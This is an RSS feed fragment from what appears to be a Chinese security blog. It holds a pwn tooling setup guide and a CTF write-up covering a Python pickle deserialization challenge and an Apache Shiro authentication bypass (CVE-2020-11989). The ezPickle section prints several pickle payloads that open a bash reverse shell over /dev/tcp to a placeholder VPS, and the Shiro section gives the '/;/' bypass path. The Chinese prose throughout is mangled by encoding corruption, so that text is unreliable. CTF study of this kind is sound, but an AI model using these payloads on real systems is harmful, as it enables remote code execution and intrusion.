&lt;p>ä¹‹åä¸€å®šä¼šè®¤çœŸèµ·æ¥çš„ï¼Œä¸ç®¡æ˜¯å­¦ä¹ ä¸Šï¼Œç”Ÿæ´»ä¸Šï¼Œè¿˜æ˜¯ä¸ªäººçš„å‘å±•ä¸Š&lt;/p>
&lt;p>æ¯å¤©åšé¢˜ä»€ä¹ˆçš„ï¼Œå‘ç°è‡ªå·±æ˜¯çœŸçš„èœï¼Œæ˜¯çœŸçš„é“æ²¸ç‰©ï¼Œè·Ÿå¤§å®¶æ¯”èµ·æ¥æˆ‘çœŸçš„æ°´å¹³å¤ªä½äº†ï¼Œæ˜¯ä¸å€¼ä¸€æçš„é‚£ç§&lt;/p>
&lt;p>å®³ï¼Œä¸å¤šè¯´äº†&lt;/p>
&lt;blockquote>
&lt;p>è·Ÿåˆ«äººå­¦ï¼Œå’Œè‡ªå·±æ¯”&lt;/p>
&lt;/blockquote></description></item><item><title>pwnç¯å¢ƒé…ç½®</title><link>https://amiaaaz.github.io/2021/10/28/pwn-env-init/</link><pubDate>Thu, 28 Oct 2021 00:41:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/28/pwn-env-init/</guid><description>&lt;p>ä»¥ä¸‹ä¸ºUbutun16.04&amp;amp;py2çš„å®‰è£…è¿‡ç¨‹ï¼Œå…¶ä»–ç‰ˆæœ¬å‘½ä»¤å‡ ä¹ç›¸åŒçš„~ï¼ˆUbuntu20&amp;amp;py3çš„æˆ‘ä¹Ÿè£…äº†ä¸€ä¸ªï¼Œæ¯•ç«Ÿpy3æ˜¯ä¸»æµï¼ŒæŠ€æœ¯æ€»æ˜¯å‘å‰å‘å±•çš„å˜›~ï¼‰&lt;/p>
&lt;p>â€”â€”â€”â€”æ¯•ç«Ÿæˆ‘æ˜¯ä»¥åˆå­¦è€…çš„è§†è§’æ¥å‡†å¤‡pwnçš„ç¯å¢ƒï¼Œè‚¯å®šè¿˜æœ‰å¾ˆå¤šä¸å…¨é¢&amp;amp;æƒ³ä¸åˆ°çš„åœ°æ–¹ï¼Œä¹‹åç”¨åˆ°äº†ä¼šå›æ¥è¡¥ä¸Šçš„~&lt;/p>
&lt;p>å®‰è£…pip2&amp;amp;pip3&amp;amp;ipython&lt;/p>
&lt;pre tabindex="0">&lt;code>curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
sudo python get-pip.py
# sudo apt-get install python3-pip
curl https://bootstrap.pypa.io/pip/3.5/get-pip.py -o get-pip.py
sudo python3 get-pip.py
sudo apt-get install ipython
&lt;/code>&lt;/pre>&lt;p>å®‰è£…py2çš„pwntools&lt;/p>
&lt;pre tabindex="0">&lt;code>pip2 install pathlib2 # py3æ— éœ€æ­¤æ¡
pip2 install pwntools
&lt;/code>&lt;/pre>&lt;p>å®‰è£…GDB&amp;amp;æ’ä»¶&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt-get install git
git clone https://github.com/pwndbg/pwndbg.git
./setup.sh
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code># ä½¿ç”¨peda-heap
git clone https://github.com/Mipu94/peda-heap.git
echo &amp;quot;source ~/peda-heap/peda.py&amp;quot; &amp;gt; ~/.gdbinit
# ä½¿ç”¨peda
git clone https://github.com/longld/peda.git
echo &amp;quot;source ~/GDB-Plugins/peda/peda.py&amp;quot; &amp;gt; ~/.gdbinit
# ä½¿ç”¨gef
git clone https://github.com/hugsy/gef.git
echo &amp;quot;source ~/gef/gef.py&amp;quot; &amp;gt; ~/.gdbinit
# ä½¿ç”¨pwndbg
echo &amp;quot;source ~/pwndbg/gdbinit.py&amp;quot; &amp;gt; ~/.gdbinit
# è‡ªåŠ¨åˆ‡æ¢è„šæœ¬ https://blog.csdn.net/aptx4869_li/article/details/81566541
&lt;/code>&lt;/pre>&lt;p>å®‰è£…one_gadget&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt-add-repository ppa:brightbox/ruby-ng
sudo apt-get update
sudo apt-get install ruby2.7 ruby2.7-dev
sudo apt-get install gem
sudo gem install one_gadget
&lt;/code>&lt;/pre>&lt;p>å®‰è£…32ä½åº“&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt-get install lib32ncurses5
sudo apt-get install lib32z1
&lt;/code>&lt;/pre>&lt;p>å®‰è£…checksec&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt instal checksec
&lt;/code>&lt;/pre>&lt;p>å®‰è£…seccomp-tools&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo gem install seccomp-tools
&lt;/code>&lt;/pre>&lt;p>å®‰è£…zshell&amp;amp;æ’ä»¶&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt-get install zsh
sh -c &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&amp;quot;
# zsh-syntax-highlighting
git clone https://github.com/zsh-users/zsh-syntax-highlighting.git
echo &amp;quot;source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&amp;quot; &amp;gt;&amp;gt; ${ZDOTDIR:-$HOME}/.zshrc
source ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
# zsh-autosuggestions
git clone https://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions
source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code># å¦‚é‡æŠ¥é”™ error: RPC failed; result=35, HTTP code=0; fatal: The remote end hung up unexpectedly
# å°†git clone https://xxxx/xxxx.git æ¢ä¸ºgit clone git://xxxx/xxxx.git
&lt;/code>&lt;/pre>&lt;p>å®‰è£…virtualboxå¢å¼ºåŠŸèƒ½&lt;/p>
&lt;pre tabindex="0">&lt;code># é‡æŠ¥é”™ unable to access â€œVBox_GAS_6.0.0 iso9660â€
sudo apt-get install --reinstall linux-image-$(uname -r)
&lt;/code>&lt;/pre>&lt;p>æœ€åç»“æœ&lt;/p>
&lt;p>ubuntu20+py3+zshï¼ˆåº”è¯¥èƒ½çœ‹å‡ºæ¥æˆ‘æ›´å–œæ¬¢è¿™ä¸ªx&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028002711973.png" alt="image-20211028002711973">&lt;/p>
&lt;p>ubuntu16+py2&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028003012735.png" alt="image-20211028003012735">&lt;/p>
&lt;hr>
&lt;p>ç¬¬ä¸€æ¬¡è£…çš„æ—¶å€™ç›´æ¥å¡åœ¨äº†pwntoolsä¸Šï¼Œåæ¥å‘ç°åŸå› æ˜¯pip2ç‰ˆæœ¬è¿‡ä½ä¸”æ— æ³•ç›´æ¥é€šè¿‡&lt;code>pip -m pip install --upgrade pip&lt;/code>è¿›è¡Œå‡çº§ï¼Œåªèƒ½æ‰‹åŠ¨ä¸‹è½½get-pip.pyåé€šè¿‡py2è¿è¡Œæ¥å®‰è£…&lt;/p>
&lt;p>è¿™æ¬¡é…å®Œä¹‹åæœ€å¤§çš„æ„Ÿè§¦å°±æ˜¯è¯¥æ¢ä¸ªå¤§ä¸€ç‚¹çš„ç¡¬ç›˜äº†ï¼Œ512Gå±å®ç»·ä¸ä½æˆ‘æè¿™ä¹ˆå¤šè™šæ‹Ÿæœºâ€¦â€¦&lt;/p>
&lt;p>ä¹‹åå¯èƒ½ä¼šæŠ½ç©ºå­¦ä¸€ä¸‹pwnï¼Œå±äºæ˜¯webç‹—å·ä¸åŠ¨äº†è¦ç»™è‡ªå·±æ‰¾ä¸ªåè·¯ï¼ˆè™½ç„¶ç™¾åˆ†ä¹‹ä¹åä¹çš„æ¦‚ç‡æ˜¯ä¸¤ä¸ªéƒ½å¾ˆèœï¼Œxsï¼‰ï¼Œå·èµ·æ¥å·èµ·æ¥ï¼ï¼ï¼&lt;/p></description></item><item><title>2021å¼ºç½‘æ‹Ÿæ€ Wp</title><link>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</link><pubDate>Tue, 26 Oct 2021 20:17:24 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</guid><description>&lt;blockquote>
&lt;p>webæœ‰3ä¸ªéƒ½æ˜¯æœ‰äº†åŒ…æµ†çš„åŸé¢˜â€¦â€¦è¿˜æœ‰ä¸€ç‚¹è„‘æ´é¢˜ï¼Œåæ­£å¥‡å¥‡æ€ªæ€ªçš„&lt;/p>
&lt;p>å±äºæ˜¯è¢«å¸ˆå‚…ä»¬å¸¦é£äº†ï¼Œæ‰€ä»¥è¯¦ç»†çš„wpè¿˜æ˜¯è‡ªå·±å†™ä¸€å†™ï¼Œè®¤çœŸåœ°å¤ç°ä¸€ä¸‹&lt;/p>
&lt;/blockquote>
&lt;h2 id="zerocalc">zerocalc&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024031549328.png" alt="image-20211024031549328">&lt;/p>
&lt;p>emmmmmm è¯´å®è¯ä¸€å¼€å§‹æ²¡æœ‰å‡º å› ä¸ºæ²¡æ‚Ÿå‡ºæ¥å®ƒè¿™æ˜¯ä¸ªä»€ä¹ˆé€»è¾‘2333333&lt;/p>
&lt;h2 id="ezpickle">ezPickle&lt;/h2>
&lt;pre tabindex="0">&lt;code># ç”¨pker.pyç”Ÿæˆpayload
notadmin=GLOBAL('config','notadmin')
notadmin[&amp;quot;admin&amp;quot;]=&amp;quot;yes&amp;quot;
exec=GLOBAL('config','backdoor')
payload='''__import__('subprocess').call(\&amp;quot;echo -e '#!/bin/bash\\nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1'&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x\&amp;quot;,shell=True)'''
exec(payload)
return
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">subprocess&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">).call(&amp;#34;echo -e &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">#!/bin/bash&lt;/span>&lt;span style="color:#8045ff">\\\\&lt;/span>&lt;span style="color:#d88200">nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x&amp;#34;,shell=True)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tR.&amp;#39;&lt;/span>
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxxxxxxxxx&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023215957693.png" alt="image-20211023215957693">&lt;/p>
&lt;p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼ŒåŸºç¡€çš„pickleé¢˜ï¼Œæ˜¯2021å·…å³°æå®¢what_pickleçš„é˜‰å‰²ç‰ˆï¼ˆæ„é€ çš„æ€è·¯å‡ ä¹ä¸€æ · ä½†æ˜¯ç®€å•å¾ˆå¤šï¼‰ï¼Œå‡ ä¹ä¸€æ ·çš„é¢˜ç›®è¿˜æœ‰ [SUCTF 2019]Guess Game&lt;/p>
&lt;p>é™åˆ¶çš„ç‚¹åœ¨äº&lt;u>&lt;a href="https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/#--%E4%BB%85%E5%8F%AF%E4%BB%A5%E5%BC%95%E5%85%A5%E9%A2%98%E7%9B%AE%E4%B8%AD%E8%87%AA%E8%AE%BE%E7%9A%84%E6%A8%A1%E5%9D%97%E6%A8%A1%E5%9D%97%E5%90%8D%E4%B8%8D%E8%83%BD%E6%9C%89__%E7%AC%A6">åªå…è®¸å¼•å…¥é¢˜ç›®è‡ªè®¾æ¨¡å—&amp;amp;é™åˆ¶æ¨¡å—ä¸­å«ä¸‹åˆ’çº¿&lt;/a>&lt;/u>ï¼Œé‚£å°±ç›´æ¥å˜é‡è¦†ç›–ï¼Œç„¶ååˆ©ç”¨ç»™å‡ºçš„&lt;code>eval()&lt;/code>å¼¹shellå°±å¥½äº†&lt;/p>
&lt;p>â€”â€”â€”â€”å¦å¤–è¿™é‡Œçš„payloadä¹Ÿå¯ä»¥æ˜¯ç®€çŸ­ç‰ˆæœ¬çš„å¼¹sehllçš„payload ä¸å”¯ä¸€å˜›&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&amp;#34;os&amp;#34;).system(&amp;#34;bash -c &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">exec bash -i &amp;amp;&amp;gt;/dev/tcp/you_vps_ip/port &amp;lt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tR.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ç”±äºè¿™é‡Œçš„ååºåˆ—åŒ–å…¥å£æ˜¯getä¼ å‚ï¼Œæ‰€ä»¥é‡åˆ°+å·ä¼šå‡ºé—®é¢˜ï¼Œä¼ è¿›å»ä¹‹å‰è¦å…ˆurlencode(encode all special chars)&lt;/p>
&lt;p>â€”â€”â€”â€”é¡ºå¸¦ç»ƒä¸ªæ‰‹ï¼Œæ“ä¸€ä¸ªä¸å«&lt;code>b'R'&lt;/code>çš„opcodeï¼ˆç”¨&lt;code>b'o'&lt;/code>ä»£æ›¿ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&amp;#34;os&amp;#34;).system(&amp;#34;bash -c &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">exec bash -i &amp;amp;&amp;gt;/dev/tcp/you_vps_ip/port &amp;lt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0(g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">o.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼ å‚çš„æ—¶å€™è®°å¾—å†urlencodeä¸€ä¸‹~~~&lt;/p>
&lt;p>â€”â€”â€”â€”ä¹‹å‰æˆ‘çš„&lt;a href="https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/">æ€»ç»“ç¬”è®°&lt;/a>å·²ç»ç›¸å½“å…¨é¢äº† &lt;del>å¯ä»¥å‡ºCTFæ•™ç§‘ä¹¦äº†233333&lt;/del>&lt;/p>
&lt;h2 id="jack-shiro">Jack-Shiro&lt;/h2>
&lt;p>å±äºæ˜¯åŸé¢˜äº†å±äºæ˜¯å±äºæ˜¯å±äºæ˜¯çƒ¤çƒ‚äº†å·²ç»ï¼Œå‚è§ &lt;a href="https://www.zhaoj.in/read-6859.html#WEB1_javaweb">[çº¢æ˜è°·CTF 2021] JavaWeb&lt;/a> | &lt;a href="https://www.huamang.xyz/index.php/archives/99/">[å¤©ç¿¼æ¯ 2021] jackson&lt;/a> | &lt;a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro">[NPUCTF2020] EzShiro&lt;/a> &lt;del>ï¼ˆè™½ç„¶æˆ‘è‡ªå·±æ ¹æœ¬æ²¡å‘ç° å®åœ¨æ˜¯åšè¿‡çš„é¢˜å¤ªå°‘äº† javaæ›´æ˜¯ä¸ä¼š æˆ‘çš„&lt;/del>&lt;/p>
&lt;p>/loginä¸‹æœ‰ä¸ªç™»å½•ï¼Œå›æ˜¾/jsonï¼Œè¿”å›çš„cookieæœ‰ä¸ªrememberMe=deleteMeï¼Œå¯ä»¥çŸ¥é“æ˜¯shiro&lt;/p>
&lt;p>è®¿é—®/jsonï¼Œåé¢ä¼šå¸¦ä¸€å †getè¯·æ±‚çš„å‚æ•°ï¼Œç”¨/;/jsonç»•è¿‡ï¼ˆcve-2020-11989ï¼‰&lt;/p>
&lt;p>ä¸Šå·¥å…·&lt;a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">JNDI-Injection-Exploit&lt;/a>ä¸€æŠŠæ¢­ï¼ˆé—®é¢˜å‡ºåœ¨æˆ‘vpsä¸Šæ²¡æœ‰javaç¯å¢ƒ ç«¯å£è½¬å‘åˆå¤„äº†äº¿ç‚¹ç‚¹é—®é¢˜â€¦â€¦ æ‰€ä»¥æ²¡æœ‰å¸¦å‡ºæ¥flagï¼‰ï¼Œæ˜¯cve-2020-36188&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024041750586.png" alt="image-20211024041750586">&lt;/p>
&lt;p>å“­å“­&lt;/p>
&lt;p>è¿˜æœ‰ä¸ªå·¥å…·æ˜¯ &lt;a href="https://github.com/Firebasky/LdapBypassJndi">LdapBypassJndi&lt;/a>ï¼Œå·®ä¸å¤šçš„ï¼›ä¸‹é¢æ˜¯è·Ÿä¸€è·Ÿæ¶‰åŠåˆ°çš„å‡ ä¸ªé“¾å­&lt;/p>
&lt;h3 id="cve-2020-11989">CVE-2020-11989&lt;/h3>
&lt;p>å‚è€ƒï¼š&lt;a href="https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA">Apache Shiroæƒé™ç»•è¿‡æ¼æ´åˆ†æ(CVE-2020-11989)&lt;/a> | &lt;a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">Apache Shiro èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ (CVE-2020-11989)&lt;/a>&lt;/p>
&lt;p>Apache Shiroæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„javaå®‰å…¨æ¡†æ¶ï¼Œåœ¨1.5.3ä¹‹å‰ç‰ˆæœ¬ä¸­å½“Shiroä¸SpringåŠ¨æ€æ§åˆ¶å™¨ä¸€èµ·ä½¿ç”¨æ—¶ï¼ˆSpringæ¡†æ¶ä¸­åªç”¨Shiroé‰´æƒï¼‰ï¼Œå¦‚æœç›´æ¥è®¿é—®/shiro/admin/pageä¼š302è·³è½¬è¦æ±‚ç™»å½•ï¼Œè€Œè®¿é—®/;shiro/admin/pageå³å¯ç»•è¿‡æƒé™éªŒè¯ï¼Œè®¿é—®/adminçš„ä¿¡æ¯&lt;/p>
&lt;h4 id="æœ¬åœ°ç¯å¢ƒæ­å»ºå¤ç°">æœ¬åœ°ç¯å¢ƒæ­å»º&amp;amp;å¤ç°&lt;/h4>
&lt;p>æœ‰å¸¦ä½¬ç›´æ¥å†™å¥½çš„dockerå¯ä»¥ç›´æ¥pullæ‹¿æ¥ç”¨&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull jackey0/cve-2020-11989
docker run -p 8426:8080 &amp;lt;image&amp;gt; /bin/sh -c 'java -jar /springboot-shiro-0.0.1-SNAPSHOT.jar'
docker pull jackey0/cve-2020-13933
// docker start &amp;lt;container-id&amp;gt;
&lt;/code>&lt;/pre>&lt;p>æˆ–è€…ä¸‹è½½&lt;a href="https://github.com/l3yx/springboot-shiro">l3yx/springboot-shiro&lt;/a>é¡¹ç›®åˆ°æœ¬åœ°ç¼–è¯‘ä¸ºwaråŒ…ï¼ˆæˆ–è€…ä¹Ÿæœ‰ç¼–è¯‘å¥½çš„&lt;a href="https://github.com/backlion/demo/blob/master/shiro.war">shiro.war&lt;/a>ï¼‰ä¹‹åæ‰‹åŠ¨æ”¾å…¥tomcatä¸‹çš„webappsç›®å½•ä¸‹è¿è¡Œã€‚æ˜¾ç„¶dockerå¤ªé¦™äº†ï¼ï¼ï¼ï¼ï¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025224051899.png" alt="image-20211025224051899">&lt;/p>
&lt;p>è®¿é—®æ˜ å°„åˆ°å¤–éƒ¨çš„8426ç«¯å£ï¼Œç¯å¢ƒæ­å»ºå®Œæ¯•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025224115269.png" alt="image-20211025224115269">&lt;/p>
&lt;p>postæ–¹å¼è¯·æ±‚/doLoginé¡µé¢ï¼Œçœ‹åˆ°cookieä¸­å«rememberMe=deleteMeï¼Œç¡®å®šä¸ºshiro&lt;/p>
&lt;p>è®¿é—®/admin/pageé¡µé¢ï¼Œ302é‡å®šå‘è‡³/loginé¡µé¢è¦æ±‚ç™»å½•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025232735464.png" alt="image-20211025232735464">&lt;/p>
&lt;p>è®¿é—®/;/admin/pageé¡µé¢ï¼Œç»•è¿‡é‰´æƒï¼Œå›æ˜¾admin page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025232717422.png" alt="image-20211025232717422">&lt;/p>
&lt;h4 id="æºç åˆ†æåŠ¨è°ƒ">æºç åˆ†æ&amp;amp;åŠ¨è°ƒ&lt;/h4>
&lt;p>å…ˆæŠŠjaråŒ…ä¸‹è½½åˆ°åœ¨æœ¬åœ°ï¼Œå¯¼å…¥idea&lt;/p>
&lt;pre tabindex="0">&lt;code>docker cp &amp;lt;container-id&amp;gt;:/springboot-shiro-0.0.1-SNAPSHOT.jar /home/name/t3mp/
&lt;/code>&lt;/pre>&lt;p>ä½¿ç”¨ideaè¿œç¨‹å¯¹dockerä¸­éƒ¨ç½²çš„springbooté¡¹ç›®è¿›è¡Œdebug&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026033544920.png" alt="image-20211026033544920">&lt;/p>
&lt;pre tabindex="0">&lt;code>docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar'
&lt;/code>&lt;/pre>&lt;p>Shiroçš„æƒé™æ ¡éªŒæ˜¯é€šè¿‡åˆ¤æ–­urlçš„åŒ¹é…æ¥è¿›è¡Œçš„ï¼Œå¦‚æœShiroè·å–çš„urlå’Œwebæ¡†æ¶å¤„ç†çš„urlç»“æœä¸ä¸€è‡´æ—¶å°±é€ æˆäº†æƒé™ç»•è¿‡ï¼›Shiroå¯¹äºurlçš„è·å–å’ŒåŒ¹é…åœ¨&lt;code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain&lt;/code>ä¸­è¿›è¡Œã€‚&lt;/p>
&lt;p>ä»¥è®¿é—®/;/admin/pageä¸ºä¾‹ï¼Œé€šè¿‡å®ƒçš„&lt;code>getPathWithinApplication()&lt;/code>å¾—åˆ°çš„requestURI=&amp;quot;/&amp;quot;&lt;/p>
